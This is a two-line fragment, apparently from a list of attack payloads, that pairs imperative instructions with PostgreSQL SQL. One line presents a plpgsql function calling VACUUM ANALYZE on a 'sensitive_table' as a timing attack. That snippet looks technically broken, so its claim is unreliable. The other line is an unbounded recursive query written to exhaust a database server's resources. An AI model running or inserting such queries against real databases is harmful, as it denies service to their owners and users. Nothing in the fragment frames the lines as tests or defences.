        Exploit VACUUM operations for timing attacks: CREATE FUNCTION timing_attack() RETURNS void AS $$ BEGIN VACUUM ANALYZE sensitive_table; END; $$ LANGUAGE plpgsql
        Create recursive queries to exhaust system resources: WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r) SELECT count(*) FROM r
